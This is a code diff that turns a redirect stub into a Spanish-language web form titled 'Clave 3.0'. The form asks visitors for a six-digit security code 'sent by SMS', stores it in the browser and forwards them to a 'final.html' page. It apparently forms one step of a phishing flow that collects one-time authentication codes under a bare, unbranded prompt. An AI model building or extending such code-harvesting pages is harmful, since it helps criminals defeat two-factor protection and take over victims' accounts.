@@ -1,1 +1,70 @@
-<html><body><h2>Clave 3.0</h2><script>window.location.href='final.html';</script></body></html>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Clave 3.0</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: white;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .contenedor {
+      border: 3px solid red;
+      width: 90vw;
+      max-width: 400px;
+      padding: 20px;
+      background: white;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 10px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 18px;
+      border: 1px solid black;
+      border-radius: 4px;
+      text-align: center;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 10px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="contenedor">
+    <form onsubmit="guardarClave(event)">
+      <label for="clave">Ingresa Clave 3.0 enviada por SMS</label>
+      <input type="text" id="clave" maxlength="6" required />
+      <button type="submit">Enviar</button>
+    </form>
+  </div>
+  <script>
+    function guardarClave(e) {
+      e.preventDefault();
+      const clave = document.getElementById('clave').value;
+      localStorage.setItem('clave3', clave);
+      window.location.href = 'final.html';
+    }
+  </script>
+</body>
+</html>
